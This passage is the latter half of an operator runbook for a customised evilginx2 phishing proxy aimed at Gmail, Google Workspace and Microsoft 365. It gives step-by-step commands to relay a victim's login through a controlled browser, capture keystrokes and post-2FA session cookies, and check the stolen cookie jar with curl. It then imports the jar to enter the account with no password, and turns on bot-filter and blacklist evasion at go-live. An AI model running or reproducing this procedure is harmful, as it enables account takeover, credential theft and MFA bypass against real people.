docker logs -f --tail=5 evilginx2 | grep --line-buffered -E "relay|status|captur|cookie|2fa|password|error|panic"
```

`--line-buffered` matters: without it grep holds output until the pipe closes.

### 25e — Run it

Open the `gs` lure (or `rl`) privately, then: email, Next → captcha → password, Next → TOTP if shown → wait. Do not close the viewer.

**✅ Gmail order:**

```
status: opening google
status: opening
status: waiting for email
status: waiting for password
status: waiting for 2fa
status: capturing
cookies captured: 14
```

**✅ GSuite order:**

```
status: opening workspace
status: waiting for sign in
sign-in link: https://accounts.google.com/...continue=https%3A%2F%2Fadmin.google.com%2F
status: waiting for email
status: waiting for password
status: waiting for 2fa
status: capturing
cookies captured: 18
```

`no usable sign-in link on the page - using direct url` may replace the link line — both routes end in the same place. `waiting for 2fa` does not always print. The pass is `cookies captured:` with a non-zero number, typically **14 to 18**. A higher count is not better or worse; it depends on how many Google properties the account touched.

### 25f — The typing test, before you hand anything to a victim

A field you cannot correct is a lost victim. Prove the keyboard on every new build:

1. Click the email box once.
2. Type `abc` — all three letters must appear.
3. Press **Backspace three times** — the box must empty.
4. Type `abcd` again — all four must appear.
5. Press **Enter** — Google must advance to the password step.

**✅ All five behave. `status: waiting for password` follows.**

| What happened | Cause | Fix |
|:--|:--|:--|
| only the first letter appears | focus is not restored before each key | `grep -c 'refocus' relay/input.go` must be ≥ 6; restore the file |
| Backspace does nothing | key sent without `Code` and virtual key codes | `grep -c 'WindowsVirtualKeyCode' relay/input.go` must be `1` |
| Enter does nothing | same | same |
| nothing at all types | the viewer is not sending `text` | `grep -c "t: 'text'" relay/viewer.html` must be `1` |
| Backspace navigates the viewer tab back | `preventDefault` missing | 8i `kdown` count, then rebuild |

### 25g — Read the result correctly

```bash
curl -sS http://127.0.0.1:18556/sessions | jq -r '.[] | [.id, .phishlet, .status, .error] | @tsv'
```

**✅ One row ending in `done` with a blank error column, and the `.phishlet` column naming the one you tested.**

Three things that are easy to get wrong:

- **`.[-1]` is not the newest.** Use the full list, or filter by phishlet as in 26a.
- **`done` is success.** `running` = in progress, `failed` = stopped, `done` = captured.
- **Captures are in `data/relay/<sid>/`, not `data/sessions/`.** `data/sessions/` exists and is empty.

```bash
cd ~/evilginx2
ls -la data/relay/
```

**✅ One directory named for the session id.**

**❌ No directory, or `failed`** → read the error column and the last log line together. **`no email field`** → dirty browser, redo 25c. **`chrome unreachable`** → 15a.

Kill a stuck session:

```bash
curl -sS http://127.0.0.1:18556/kill/<sid>
```

**⚠️ One session is one Chromium, whichever phishlet. One at a time.**

---

## 🍪 STAGE 26 — Build and verify the jar

**Track A:**

```bash
cd ~/evilginx2
python3 make_cookie_import.py
```

**✅ All three `PRESENT`: `ESTSAUTH`, `ESTSAUTHPERSISTENT`, `ESTSAUTHLIGHT`.**

**❌ Any absent** → redo Stage 24 with "Stay signed in" → Yes.

**Track B:** no converter — the relay wrote import format. Verify instead.

### 26a — Locate the capture, by phishlet name

**Why not `[0]` or `[-1]`:** the session list is unordered, and on a box with two captures `[0]` will happily hand you the gmail jar while you are testing gsuite.

```bash
cd ~/evilginx2
PH=relay-gsuite        # change to relay-gmail when testing gmail
SID=$(curl -sS http://127.0.0.1:18556/sessions | jq -r --arg p "$PH" '[.[] | select(.status=="done" and .phishlet==$p)][0].id')
echo "sid=$SID"
curl -sS http://127.0.0.1:18556/sessions | jq -r --arg s "$SID" '.[] | select(.id==$s) | .phishlet'
ls -la "data/relay/$SID/"
```

**✅ A hex `sid=`, the phishlet name, and three files.**

**❌ Empty `sid=`** → no `done` session for that phishlet; check `PH` or redo Stage 25.

### 26b — The seven cookies that decide everything

```bash
cd ~/evilginx2
jq -r '.[].name' "data/relay/$SID/cookies.json" | sort
jq -r '.[].name' "data/relay/$SID/cookies.json" | grep -cE '^(SID|HSID|SSID|SAPISID|APISID|__Secure-1PSID|__Secure-3PSID)$'
```

**✅ A list including `__Secure-3PSID` and `__Secure-3PAPISID`, then `7`.**

`__Secure-3PSID` is only minted **after a second factor** — its presence proves the flow completed.

**❌ `0` to `2`** → captured too early; redo Stage 25.

### 26c — Domain and expiry

```bash
cd ~/evilginx2
jq -r '.[] | [.domain, .expirationDate] | @tsv' "data/relay/$SID/cookies.json" | sort -u
jq -r '[.[] | select(.session == true)] | length' "data/relay/$SID/cookies.json"
```

**✅ `.google.com` and `myaccount.google.com` only, expiry around `1797…` to `1826…`, `0` session-only.**

The field is **`expirationDate`**, not `expires`.

**❌ `null` everywhere** → session-only jar; import into a live window and never close it.

### 26d — The Netscape file

```bash
cd ~/evilginx2
head -1 "data/relay/$SID/cookies.txt"
awk -F'\t' 'NF>=7 && $1 !~ /^#/ {print $1"\t"$6"\t"$7}' "data/relay/$SID/cookies.txt"
```

**✅ The first line starts `#HttpOnly_`, every data line has seven tab-separated fields.**

`#HttpOnly_` is written by Chrome and is valid.

**❌ Fewer than seven fields** → truncated; redo Stage 25.

### 26e — Prove it outside a browser

**Two things are mandatory here: `-L` and a real user agent.** A bare `curl` sends `curl/7.x` and follows no redirect, so it answers `301` or `302` on a perfectly good jar. That number is the correct answer to the wrong question and has already been mistaken for staleness once.

```bash
cd ~/evilginx2
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36'
curl -sSL -A "$UA" -b "data/relay/$SID/cookies.txt" -o /dev/null -w "mail:  %{http_code}\n" https://mail.google.com/
curl -sSL -A "$UA" -b "data/relay/$SID/cookies.txt" -o /dev/null -w "admin: %{http_code}\n" https://admin.google.com/ac/home
```

**✅ `mail: 200`, and for a gsuite capture also `admin: 200`.**

**❌ `mail: 200` with `admin: 302`** → you are holding the gmail jar, not the gsuite one. Check `echo "$SID"` and `PH`.
**❌ `301` or `302` on **both**, even with `-L` and the user agent** → genuinely stale or partial jar; redo Stage 25.
**❌ `403`** → `blacklist off`, retry.

### 26f — Stage the import file

```bash
cd ~/evilginx2
cp "data/relay/$SID/cookies.json" cookies-import.json
chmod 644 cookies-import.json
head -c 1 cookies-import.json; echo
jq 'length' cookies-import.json
jq -r '[.[] | has("domain","name","value","path","secure","httpOnly","expirationDate")] | all' cookies-import.json
```

**✅ `[`, a count of **14 to 18**, `true`.**

**`18` is a pass, not a fail.** The count depends on how many Google properties the account touched during the run; there is no "correct" number beyond a floor of 14.

**❌ `{`** → you copied `session.json`. **❌ `false`** → a field is missing; redo Stage 25. **❌ A count under `14`** → partial capture; redo Stage 25.

---

## 🌍 STAGE 27 — Import (the no-red-page proof)

Cookie-Editor installed. Fresh private window. The exact real host — `https://login.microsoftonline.com` for Track A, `https://accounts.google.com` for either relay.

On Windows, open **Command Prompt** (not Git Bash — `%VAR%` only expands in `cmd.exe`):

```
cd %USERPROFILE%\Downloads
scp root@95.133.229.17:~/evilginx2/cookies-import.json .
```

Notepad → open the file → `Ctrl+A`, `Ctrl+C` → Cookie-Editor → Import → paste → Confirm → `F5` → go to `gmail.com`, `admin.google.com`, or the M365 portal.

**✅ Inside the account. No red banner, no password prompt.**

**❌ "invalid format"** → the paste does not start with `[`. **❌ Red banner** → redo Stage 25. **❌ Sign-in form again** → wrong host. **❌ Logs out after a minute** → session cookies only. **❌ `__Host-` rejected** → import on the exact host, then open `login.live.com` once. **❌ Google rejects** → copy localStorage from `.all.json`.

`myaccount.google.com` entries are host-only and will not apply on `accounts.google.com`. Expected.

---

## 🧬 STAGE 28 — Pro features

**28a** — F12 → Console on a lure → `evilginx: email autofilled -> ...`. Nothing → `DOM_INJECTION` not `true`.

**28b** — `rewrite_urls` stays off. It rewrites the authorize path to `/signin?boop=`, Microsoft appends `&sso_reload=true`, the exact-match cache misses, and you get evilginx's own 404.

```bash
cd ~/evilginx2
sed -i 's/^REWRITE_URLS=.*/REWRITE_URLS=true/' .env
docker compose up -d
docker logs -f evilginx2 | grep -iE "rewrite|404"
```

**✅ `/signin?boop=<random>` and the page loads. `404`** → back to `false`:

```bash
cd ~/evilginx2
sed -i 's/^REWRITE_URLS=.*/REWRITE_URLS=false/' .env
docker compose up -d
```

**28c** — Proxies are console-only:

```
proxy create uk-1 socks5 1.2.3.4 1080
proxy test uk-1
proxy list
proxy assign phishlet office365 uk-1
proxy off
proxy delete uk-1
```

`Command 'proxy' not found` → you are in the shell. `context deadline exceeded` → dead proxy; verify with `curl -sS --socks5 1.2.3.4:1080 https://api.ipify.org; echo`.

Relay egress always goes through the guard. A second hop is `RELAY_UPSTREAM_PROXY`. SOCKS5 preserves the JA4 signature.

**28d** — Consumer tokens to optional (office365 only):

```bash
cd ~/evilginx2
python3 - <<'PYEOF'
import os
p = os.path.expanduser("~/evilginx2/phishlets/office365.yaml")
s = open(p, encoding="utf-8").read()
keys = ["uaid","MSPRequ","MSCC","MSPOK","__Host-MSAAUTHP","MSPPre","MSPCID",
        "MSPAuth","MSPProf","NAP","ANON","WLSSC","SDIDC","JSHP","JSH",
        "MSPSoftVis","OParams","MSPBack","ai_session",
        "MicrosoftApplicationsTelemetryDeviceId","MSFPC","__Host-MSAAUTH",
        "wlidperf","PPLState","RPSSecAuth"]
n = 0
for k in keys:
    for q in ("'", '"'):
        old, new = "%s%s:always%s" % (q, k, q), "%s%s:opt%s" % (q, k, q)
        if old in s:
            n += s.count(old); s = s.replace(old, new)
open(p, "w", encoding="utf-8").write(s)
print("flipped", n, "keys to :opt")
PYEOF
docker compose restart evilginx2
```

**✅ `flipped 27 keys to :opt`, or `0` if already done.**

---

## 📱 STAGE 29 — Telegram

Attach first (`docker attach evilginx2`, wait for `:`), then:

```
config telegram test
```

**✅ A message arrives.** Detach `Ctrl-P` `Ctrl-Q`.

**❌ `404`** → placeholder token. **❌ Duplicates** → comment out `telegram-watch.sh` in `entrypoint.sh` and `up -d --build`.

---

## 🗺️ STAGE 30 — GeoIP (optional)

MaxMind → `GeoLite2-City.mmdb` → `~/evilginx2/data/GeoIP/` → `docker compose restart`.

**✅ `geoip: GeoIP initialized — country tracking active`.** Flags: `-block-vpn`, `-block-countries RU,CN`.

---

## 🧰 STAGE 31 — Operations

```bash
cd ~/evilginx2

tmux new -s eg                              # if it already exists: tmux attach -t eg
docker attach evilginx2                     # Ctrl-P Ctrl-Q detaches, Ctrl-B D escapes tmux
docker logs -f evilginx2
docker logs -f chrome
docker compose up -d                        # APPLY .env — mandatory
docker compose down && docker compose up -d # hard restart
jq -r '"http=\(.general.http_port) https=\(.general.https_port) autocert=\(.general.autocert)"' data/config.json
jq -r '.blacklist.mode' data/config.json

curl -sS http://127.0.0.1:18556/health | jq .
ls -la data/relay/ ; ls -la data/exports/
free -m | head -2
python3 validate_phishlet.py
python3 validate_gsuite.py
python3 make_cookie_import.py
```

`tmux new -s eg` fails with `duplicate session: eg` if it exists, so it is its own command here, not chained with `&&`.

Kill every stuck session:

```bash
curl -sS http://127.0.0.1:18556/sessions | jq -r '.[] | select(.status=="running") | .id' \
  | while read id; do curl -sS http://127.0.0.1:18556/kill/$id; echo; done
```

Nightly cleanup:

```bash
(crontab -l 2>/dev/null; echo "0 4 * * * find /root/evilginx2/data/relay -type f -mtime +30 -delete") | crontab -
```

Health one-liner:

```bash
docker logs evilginx2 2>&1 | grep -E "relay: (guard|attached|disabled)" \
 && curl -sS -o /dev/null -w "8082 login page: %{http_code}\n" http://127.0.0.1:8082/login \
 && curl -sS -o /dev/null -w "plain-on-443: %{http_code}\n" --max-time 5 http://127.0.0.1:443/ \
 && docker logs evilginx2 2>&1 | grep -c 'wildcard certificate loaded for'
```

---

## 🧯 STAGE 32 — Troubleshooting

### Ports and certificates — always first

| Symptom | Cause | Fix |
|:--|:--|:--|
| `wrong version number` on a **relay** host only | the relay got a pre-handshake conn | Stage 0 `secure.Handshake()` must be `1`; `git pull`, rebuild |
| `wrong version number` on **all** hosts | plaintext on 443 | Stage 12: confirm `80`/`443`, `down`/`up`, re-check `plain-on-443` = `000` |
| `plain-on-443` returns `200`/`301` | plaintext on 443 | same |
| `Unknown (72)` in an openssl trace | the byte on the wire was `H` from `HTTP/` | same |
| **empty output with no error text** | you used `curl -s` | rerun with `-sS` |
| no `http port set to` line | listener absent | Stage 0 `port := 80` was `0`, `git pull`, rebuild |
| nothing on `:80` | bind failed | `docker logs evilginx2 \| grep -i 'bind\|in use\|permission'` |
| `address already in use` on `:80` | something holds it | `ss -lntup \| grep ':80 '` |
| `Empty reply from server` | no cert for that host | 20e, then 20f |
| `crt/sites/` empty | expected — autocert off, wildcard serves | none |
| ACME `429 too many certificates` | autocert still on | 20g |
| `obtaining and setting up N TLS certificates` on every enable | autocert still on | 20g |
| `wildcard certificate: failed to load` | key does not match cert | redo 20c |
| `no wildcard certificate found` | wrong filenames | 20e — must be `fullchain.pem` + `privkey.pem` |
| wildcard load count `0` | cert never installed | 20e, then 20f |
| `403` on every curl proof | `blacklist unauth` banned your IP | `blacklist off`, retry |
| `http_port` reverts to `0` after `up -d` | config edited while the container ran | 12b in the order shown: stop, edit, start |

### Chrome start-up

| Symptom | Cause | Fix |
|:--|:--|:--|
| `chrome unreachable: dial tcp 127.0.0.1:9222: connect: connection refused` | 9222 polled while the container was still booting; `restart` returns instantly | 15a poll loop, then reopen the lure. Not a code fault |
| Same error on **both** phishlets | same container, same boot | same |
| `docker ps --format` says `can't evaluate field RestartCount` | `ps` has no such field | use `docker inspect -f '{{.State.RestartCount}}' chrome` |
| `/json/list` shows `http://applewebkit/`, `http://(windows/`, `http://gecko)/` | user-agent split on its spaces and each fragment became a tab | 15b — `set --` must be `4`, then rebuild chrome |
| container `Restarting`, count climbing | crash loop | 15c: `stop`, `rm -f`, `up -d` |
| `oom=true` | memory | one session at a time; recreate chrome |
| healthcheck stuck `unhealthy` | `curl` missing from the image | 8f |
| VNC blank | Xvfb died | `docker logs chrome` |

### Typing and input

| Symptom | Cause | Fix |
|:--|:--|:--|
| only the first character types, rest vanish | no refocus before each key | `grep -c 'refocus' relay/input.go` ≥ 6; restore file, rebuild |
| Backspace, Delete, arrows, Tab, Enter do nothing | key events sent with only `Key` set, no `Code` or virtual key codes | `grep -c 'WindowsVirtualKeyCode' relay/input.go` must be `1` |
| Backspace makes the viewer tab navigate back | `preventDefault` missing in the viewer | `grep -c 'kdown' relay/viewer.html` must be `1` |
| nothing types at all | viewer not sending `text` | `grep -c "t: 'text'" relay/viewer.html` must be `1` |
| `s.dispatch undefined` at build | `input.go` replaced by a version without the method | `git show HEAD:relay/input.go > relay/input.go`, then re-apply the key fix |
| clicks land in the wrong place | canvas scale not applied | `scale` from `getBoundingClientRect` in the viewer |
| paste does nothing | no paste listener | `grep -c 'paste' relay/viewer.html` must be `2` |

### Relay

| Symptom | Cause | Fix |
|:--|:--|:--|
| **status lines never appear at all** | `RELAY_DEBUG` not in the container | `docker exec evilginx2 printenv RELAY_DEBUG` must print `true`; add the compose line, `up -d` |
| **frozen at `opening google`, tab is on `myaccount.google.com`** | `Page.Navigate` waiting for lifecycle-idle against `CheckConnection` long-polls | Stage 0 `proto.PageNavigate` must be `1`, `WaitLoad` `0` |
| **frozen at `waiting for password`** | `exists`/`wait` calling unbounded `Element()` | Stage 0 `Timeout(time.Second).Element` must be `2` |
| **log prefix is the whole script** | `runner.log()` using `r.script` | Stage 0 `func (r \*Runner) name` must be `1` |
| `fail: no email field` about 40 s in | orphan tab satisfied a stale selector | 25c recreate, then retry |
| `websocket bad handshake: 404 Not Found` | rod dialled the bare control URL | Stage 0 `resolveChromeURL` must be `3` |
| `websocket bad handshake: 403` | DevTools origin rejected | Stage 0 `remote-allow-origins` must be `1` |
| relay host prints nothing | no cert, or a banned IP | 20f, then 13 |
| Stuck "Connecting…" | start failed | `docker logs evilginx2 \| grep relay` |
| `502` on `/__relay/start` | script missing | `ls scripts/`, fix `script:` |
| `404` on a relay host | hostname set to `rl.` or `gs.` | `phishlets hostname <phishlet> DOMAIN` |
| `frame: 404` | not painted yet | wait 2 s, retry |
| Frames freeze, runs die | low memory / orphans | recreate chrome, one session at a time, or resize |
| Sessions reaped mid-flow | idle or max cap | raise `RELAY_IDLE_SECONDS` / `RELAY_MAX_SECONDS` |

### GSuite specifically

| Symptom | Cause | Fix |
|:--|:--|:--|
| capture fires instantly, 0 cookies | `hostIs` replaced with a plain `indexOf` | restore `hostIs`; Stage 0's count must be `1` |
| landing page counts as the login form | `atIdentifier` removed | restore it; the gate checks `function atIdentifier` |
| capture ends on `workspace.google.com` | the continue rewrite dropped | confirm `FALLBACK_URL` still carries the encoded continue |
| `no email field` on a Russian landing page | sign-in anchor missing, 30 s burned | `SIGNIN_JS` must carry five patterns; first wait is 8 s |
| `unbalanced` from the validator | an apostrophe in a comment, or an escaped quote inside a single-quoted literal; the counter strips neither comments nor escapes | `grep -n '^[[:space:]]*//' scripts/relay-gsuite.js \| grep "'"` and `grep -c '\\"' scripts/relay-gsuite.js`; fix both to zero |
| `ModuleNotFoundError: yaml` from the validator | `python3-yaml` not installed | Stage 6; `apt install -y python3-yaml` |
| `unknown page binding` | typo in a `page.` call | the message names it |
| `collides with relay-gmail` | `gs` or `workspace` reused | 21a |
| `login: 'domain' must contain a value of one of the hostnames` | `login.domain` no longer equals `orig_sub + domain` | both must be `workspace` + `google.com` |
| `admin: 302` on the jar check | wrong jar, or the redirect was not followed | 26a to select by phishlet, 26e for the `-L` form |
| `gs: 404` while `rl: 200` | the gsuite hostname was set to `gs.` | redo 23e with the apex |

### Capture files

| Symptom | Cause | Fix |
|:--|:--|:--|
| `find: '~/evilginx2/sessions': No such file` | wrong path | captures are in `data/relay/<sid>/` |
| `.[-1]` shows `failed` while a success exists | list is unordered | use `select(.status=="done")` with a phishlet filter, 26a |
| `ls /app/sessions` empty | that directory is unused | read `data/relay/` on the host |
| `done` read as "maybe fine" | it is the success status | `running` = in progress, `failed` = stopped, `done` = captured |
| `.expires` prints blank | field is `expirationDate` | read `expirationDate` |
| jar has no `__Secure-3PSID` | captured before the second factor | redo Stage 25 |
| `head -1` does not show `# Netscape` | Chrome writes `#HttpOnly_` | correct as-is |
| `mail: 301` / `admin: 302` on the jar check | bare `curl`, no `-L`, no user agent | 26e — `-sSL -A "$UA"` |
| `301`/`302` even **with** `-L` and the user agent | stale or partial jar | redo Stage 25 |
| import count is `18`, guide said 17 | the range is 14–18 | `18` is a pass |

### Build and platform

| Symptom | Cause | Fix |
|:--|:--|:--|
| `RelayConfig redeclared` | `relay_phishlet.go` present | 8a |
| `method redeclared` | `relay_bridge.go` present | 8a |
| `cannot find vendor directory` | vendor ignored | 8c |
| `undefined: resolveChromeURL` | old `relay/manager.go` | `git pull` |
| `undefined: io` | manager import lost | `git checkout -- relay/manager.go && git pull` |
| `HTTPChallengeHandler undefined` | old `http_proxy.go` | `git pull` |
| `import cycle` | `relay/` imports `core` | remove the import |
| `go.mod requires go >= 1.26` | base reverted | `git checkout -- Dockerfile && git pull` |
| `syntax error near unexpected token` | Go or YAML pasted at the prompt | it is file content; write it into the file |
| `healthcheck:: command not found` | same, for YAML keys | same |
| `Could not resolve host` | Stage 4 broke DNS | `systemctl start systemd-resolved` |
| Container `Restarting` | crash loop | `docker logs --tail 60 evilginx2` |
| Port 53 bind error | Stage 4 skipped | redo Stage 4 |
| `Repository not found` at clone | repo private, no token used | Stage 7 — enter the PAT, or make the repo public |

### Console and detach

| Symptom | Cause | Fix |
|:--|:--|:--|
| `Ctrl-P Ctrl-Q` does nothing | no TTY | `tty: true`, 8d |
| `Ctrl-Q` swallowed | XON | `stty -ixon`, Stage 6 |
| cannot scroll up in tmux | mouse mode off | `set -g mouse on` in `~/.tmux.conf`, then `tmux source-file` |
| `sessions should be nested with care` | already inside a session | `Ctrl-b d`, or `tmux new -d -s name` + `tmux switch-client -t name` |
| `duplicate session: eg` | session exists | `tmux attach -t eg`, or `tmux kill-session -t eg` |
| `service "evilginx" is not running` | wrong name | `evilginx2` |
| `Command 'config' not found` | host shell | attach first |
| `blacklist: invalid syntax: [clear]` | command does not exist | bare `blacklist` lists, `blacklist off` disables |
| commands lost | pasted before the prompt | wait for `:` |
| stuck attach | — | `Ctrl-]`, `Ctrl-B D`, or close the window |

### Proxy and panels

| Symptom | Cause | Fix |
|:--|:--|:--|
| `8082` login rejected after edit | used `restart` | `docker compose up -d` |
| `too many login attempts` | lockout | wait five minutes |
| Hostname collision | duplicate `phish_sub` | 21a |
| Colours shift every reload | CSS randomisation | `CSS_RANDOMIZATION=false` + `up -d` |
| Blocked while testing with curl | bot filter | `BOT_FILTER=false` + `up -d` |
| `/signin` returns `404` | `sso_reload` cache miss | `REWRITE_URLS=false` + `up -d` |
| `complete=false` forever | tokens `:always` | 28d |
| Cookie-Editor "invalid format" | paste missing `[` | Stage 26f, then the scp route |
| `Command 'proxy' not found` | in the shell | attach first |

---

## 🗂️ STAGE 33 — What lives where

| Path | Contents |
|:--|:--|
| `phishlets/` | phishlets, including `relay-gmail.yaml` and `relay-gsuite.yaml` |
| `scripts/` | relay scripts, including `relay-gmail.js` and `relay-gsuite.js` |
| `relay/input.go` | key and pointer dispatch, with the virtual key table |
| `relay/viewer.html` | the victim-facing viewer and its keystroke capture |
| `validate_gsuite.py` | gsuite pre-enable validator |
| `data/` | config, certs, captures, exports |
| `data/crt/wildcard/` | the wildcard pair |
| `data/data.db` | sessions, accounts, audit log |
| `data/exports/` | exported jars |
| **`data/relay/<sid>/`** | **captures — `cookies.json`, `cookies.txt`, `session.json`** |
| `data/allowdeny.txt` | guard rules |
| `data/country.csv` | guard country table |
| `data/backups/` | scheduled copies |
| `data/GeoIP/` | optional MaxMind DBs |
| `.env` | secrets and switches, untracked |
| `/app/sessions` | exists, unused — do not look here |

Everything you care about is under `data/`. `RELAY_OUTPUT_DIR` must stay there.

---

## ✅ STAGE 34 — Go-live

Turn the bot defences back on — **the only place in this guide where they go on** — and take the two testing values back to production on **both** phishlets:

```bash
cd ~/evilginx2
sed -i 's/^BOT_FILTER=.*/BOT_FILTER=true/' .env
sed -i 's/^RELAY_DEBUG=.*/RELAY_DEBUG=false/' .env
sed -i 's/^RELAY_MAX_SECONDS=.*/RELAY_MAX_SECONDS=900/' .env
sed -i 's/^  debug: true/  debug: false/' phishlets/relay-gmail.yaml
sed -i 's/^  debug: true/  debug: false/' phishlets/relay-gsuite.yaml
docker compose up -d
sleep 10
docker exec evilginx2 printenv RELAY_DEBUG
docker exec evilginx2 printenv RELAY_MAX_SECONDS
grep -c 'debug: false' phishlets/relay-gmail.yaml
grep -c 'debug: false' phishlets/relay-gsuite.yaml
```

**✅ `false`, `900`, `1`, `1`.**

Attach (`docker attach evilginx2`, wait for `:`), then:

```
blacklist unauth
```

Detach `Ctrl-P` `Ctrl-Q`. Then:

```bash
curl -sS -o /dev/null -w 'plain-on-443: %{http_code}\n' --max-time 5 http://127.0.0.1:443/
curl -sSI https://rl.gyfdghf.store/ | head -1
curl -sSI https://gs.gyfdghf.store/ | head -1
```

**✅ `plain-on-443: 000`.** The two `curl -sSI` lines may print `403` or nothing at all — **that is the blacklist doing its job**, not a fault. Read the table below before reacting.

### Two things here look like breakage and are not

1. **`blacklist unauth` bans your own IP.** Your proofs run on the VPS, so they source from `95.133.229.17` and the next `curl` returns `403` or an empty line. That is the blacklist working. Fix: `blacklist off`, retry, then leave it off while you work. It goes back on at the end.
2. **`debug: false` silences the relay log completely.** `status:` lines stop entirely. That is not a dead relay. If a capture misbehaves, set both phishlets back to `debug: true`, `docker compose up -d`, reproduce, then return them.

### Post-go-live smoke test, with the defences on

Do one full capture yourself on the `gs` lure. `cookies captured:` will be absent from the log now, so the proof is the filesystem and the newest capture directory, not the log:

```bash
cd ~/evilginx2
SID=$(ls -1t data/relay/ | head -1)
echo "sid=$SID"
jq -r '.[].name' "data/relay/$SID/cookies.json" | grep -cE '^(SID|HSID|SSID|SAPISID|APISID|__Secure-1PSID|__Secure-3PSID)$'
```

**✅ A `sid=` newer than your previous captures, then `7`.**

**❌ The same `sid=` as before** → the run never wrote a new directory; the capture failed. **❌ A count under `7`** → partial capture; set `debug: true` temporarily and redo Stage 25.

`ls -1t` sorts by modification time, newest first, so it cannot hand you an old capture the way `[0]` can.

Checklist:

- [ ] 0a: twenty correct counts on a clean clone
- [ ] 0c: secrets saved, if upgrading an existing box
- [ ] 3: `dig` returns the IP for `@`, `*`, `rl`, `gs`
- [ ] 4: `ss -lntup | grep ':53 '` silent
- [ ] 5: seven rules, no 18555/18556/9222/6080
- [ ] 6: `-ixon` printed, `set -g mouse on` in `~/.tmux.conf`, `python3-yaml` installed
- [ ] 7: identity echoes back
- [ ] 8: all green, `COMPOSE_OK`, healthcheck indented, `curl` in the chrome Dockerfile, `validate_gsuite.py` `PASSED` with `bindings 12`
- [ ] 9: `GZ_OK`, build and vet silent
- [ ] 10: clean `.env`, both user-agents on `Chrome/156`, `getMe` `ok:true`, `exit=0`
- [ ] 11: both `Up`, `tty=true`, **`PORT80_OK`**, `printenv RELAY_DEBUG` = `true`
- [ ] **12c: `plain-on-443: 000`**
- [ ] **13: `.blacklist.mode` = `off`**
- [ ] 14: `200 / 403 / 403 / 200`
- [ ] **15a: ready line, one `about:blank`, no `http://applewebkit/` entries**
- [ ] 15d: Chrome version, `ok:true`
- [ ] 16: control `ok:true`, refused from the internet
- [ ] 17: `login successful`, `enabled: true`
- [ ] 18: domain, IP, `strip_headers on`, no `not set` warnings
- [ ] 19: warnings gone after restart
- [ ] **20f: wildcard load count ≥ `1`**
- [ ] **20g: `.general.autocert` = `false`**
- [ ] **20h: `plain-on-443: 000`, 20i TXT deleted**
- [ ] 21: no duplicate `phish_sub`, allow count `13`, `meta: 403`
- [ ] 22: validator `PASSED`, `login: 200`
- [ ] 23b: `dispatch`, `WindowsVirtualKeyCode`, `inputNamedKeys`, `kdown`, `set --` all counted
- [ ] **23f: `HTTP/1.1 200` and health `true` on both hosts**
- [ ] **23g: two `sid` values, `frame: 200`**
- [ ] **25f: typing test — `abc`, three Backspaces, `abcd`, Enter**
- [ ] 24/25: `complete=true` / status `done` with the right `.phishlet`
- [ ] 26b: seven critical cookies, `__Secure-3PSID` present
- [ ] 26e: `mail: 200`, `admin: 200` with `-L` and the user agent
- [ ] 27: inside the account, no red page
- [ ] 29: `config telegram test` delivered
- [ ] 34: `BOT_FILTER=true`, `blacklist unauth`, debug off both, 900 s, proofs still green, smoke test shows a **new** `sid` and `7`
- [ ] 31: `Ctrl-P Ctrl-Q` detaches

All ticked = live.

### Run order

```
0        clean-clone gate (plus 0b/0c only if maintaining or upgrading)
1        reinstall
2-6      preflight, DNS with four records, port 53, firewall, docker, tmux scroll
7        clone, identity, PAT
8        tree gate, two deletions, healthcheck, Dockerfile curl, code greps, dispatch contract, gsuite validator
9        Go, build, vet — silent
10       .env with Chrome/156 on both user-agents
11       COMPOSE_OK, both images, up -d, PORT80_OK, printenv
12       confirm ports (stop, edit, start), plain-on-443 = 000
13       blacklist off
14       guard 200/403/403/200
15       chrome recreate, readiness poll, clean /json/list, desktop, control
16-17    control refused, panels
18-19    console, base config, persistence
20       wildcard, load gate, autocert off, TXT cleanup
21       collision script, guard rules with 13 allows, reload
22       TRACK A — enable, gate, lure, render check
OR
23       TRACK B — validate, enable gmail, enable gsuite, gate both, link proof
24       TRACK A capture
OR
25       TRACK B capture — recreate, readiness, memory, log tail, statuses, typing test
26       jar verify by phishlet, seven cookies, curl -L with user agent, import file staged
27       import
28-33    pro features, telegram, geoip, ops, troubleshooting, map
34       bot filter on, debug off both, 900 s, blacklist unauth, final proofs, smoke test
```

---

## 🏅 STAGE 35 — Renewal

90 days. Renewal needs the TXT records again. Day-60 reminder — an expired wildcard drops every host at once, including `rl` and `gs`, and with autocert off there is no automatic recovery.

```bash
~/.acme.sh/acme.sh --issue --dns --keylength ec-256 \
  -d 'gyfdghf.store' -d '*.gyfdghf.store' \
  --server letsencrypt \
  --yes-I-know-dns-manual-mode-enough-go-ahead-please
```

Add both TXT records, wait for `dig +short TXT _acme-challenge.gyfdghf.store @1.1.1.1` to show them, then:

```bash
~/.acme.sh/acme.sh --renew --dns --keylength ec-256 \
  -d 'gyfdghf.store' -d '*.gyfdghf.store' \
  --server letsencrypt \
  --yes-I-know-dns-manual-mode-enough-go-ahead-please
CD=~/.acme.sh/gyfdghf.store_ecc
cd ~/evilginx2
cp "$CD/fullchain.cer" data/crt/wildcard/fullchain.pem
cp "$CD/gyfdghf.store.key" data/crt/wildcard/privkey.pem
OWN=$(stat -c '%u:%g' data/config.json)
chown "$OWN" data/crt/wildcard/fullchain.pem data/crt/wildcard/privkey.pem
chmod 644 data/crt/wildcard/fullchain.pem
chmod 600 data/crt/wildcard/privkey.pem
docker compose restart evilginx2
docker logs --tail 20 evilginx2 | grep -i wildcard
```

**✅ `wildcard certificate loaded`.** Delete the TXT records. Re-check `plain-on-443: 000`.

Leave `autocert` off — the manual pair is the source of truth.

---

**End of guide.** If a stage fails outside these tables, paste the command, the exact output, and the stage number.

---

## What changed from v23, and why

| # | Change | Error it prevents |
|:--|:--|:--|
| 1 | `docker/chrome/start.sh` builds arguments with `set --` | user-agent split into eleven junk tabs, truncated UA on every request |
| 2 | Both user-agents set to `Chrome/156` | UA claiming 131 against a 156 engine |
| 3 | Compose healthcheck on `chrome` + `curl` in its Dockerfile | blind `sleep` against a booting container |
| 4 | Stage 15a and 25c poll 9222 for up to 60 s | `chrome unreachable: connect: connection refused` |
| 5 | `/json/list` cleanliness check | junk targets going unnoticed |
| 6 | `relay/input.go` rewritten: `Code`, `WindowsVirtualKeyCode`, `NativeVirtualKeyCode`, refocus | Backspace, Delete, arrows, Tab, Enter all dead |
| 7 | Refocus before every event | only the first character of a word arriving |
| 8 | `relay/viewer.html` sends `kdown`/`kup` for modifiers, `preventDefault` on handled keys | Backspace navigating the viewer tab away |
